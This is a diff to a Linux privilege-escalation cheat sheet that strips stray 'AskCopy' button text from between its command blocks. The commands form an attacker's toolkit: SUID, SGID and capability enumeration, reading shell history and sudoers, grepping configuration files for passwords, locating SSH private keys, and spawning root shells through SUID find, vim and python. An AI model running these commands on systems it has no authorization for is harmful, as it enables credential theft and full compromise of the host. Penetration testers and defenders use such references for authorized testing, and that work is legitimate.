@@ -40,15 +40,11 @@ find / -perm -u=s -type f 2>/dev/null
 
 Find all SGID binaries
 
-
-
 ```
 find / -perm -g=s -type f 2>/dev/null
 ```
 
 Find binaries with Linux capabilities set
-
-AskCopy
 
 ```
 getcap -r / 2>/dev/null
@@ -56,15 +52,11 @@ getcap -r / 2>/dev/null
 
 Find world-writable files
 
-AskCopy
-
 ```
 find / -writable -type f 2>/dev/null | grep -v proc
 ```
 
 Check environment variables and shell history
-
-AskCopy
 
 ```
 env && cat ~/.bash_history && cat ~/.bashrc
@@ -72,15 +64,11 @@ env && cat ~/.bash_history && cat ~/.bashrc
 
 Kernel version for exploit research
 
-AskCopy
-
 ```
 cat /proc/version && cat /etc/issue && uname -r
 ```
 
 Running processes owned by root
-
-AskCopy
 
 ```
 ps aux | grep root
@@ -88,15 +76,11 @@ ps aux | grep root
 
 Listening ports — internal services not exposed externally
 
-AskCopy
-
 ```
 ss -tlnp && netstat -tlnp 2>/dev/null
 ```
 
 Search readable config files for passwords
-
-AskCopy
 
 ```
 find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
@@ -104,15 +88,11 @@ find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/nu
 
 Search a directory recursively for password references
 
-AskCopy
-
 ```
 grep -Rni "password" /var/www 2>/dev/null
 ```
 
 Read sudoers file if accessible
-
-AskCopy
 
 ```
 cat /etc/sudoers 2>/dev/null && cat /etc/sudoers.d/* 2>/dev/null
@@ -120,23 +100,16 @@ cat /etc/sudoers 2>/dev/null && cat /etc/sudoers.d/* 2>/dev/null
 
 Check home directory dotfiles for credentials
 
-AskCopy
-
 ```
 ls -la /home/*/.*
 ```
 
 Find SSH private keys
-
-AskCopy
-
 ```
 find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null
 ```
 
 find SUID — execute shell with SUID permissions
-
-AskCopy
 
 ```
 /usr/bin/find . -exec /bin/sh -p \;
@@ -144,15 +117,11 @@ AskCopy
 
 vim SUID — spawn shell from within vim
 
-AskCopy
-
 ```
 vim -c ":!/bin/sh"
 ```
 
 python SUID — exec shell preserving SUID
-
-AskCopy
 
 ```
 python3 -c "import os; os.execl('/bin/sh', 'sh', '-p')"
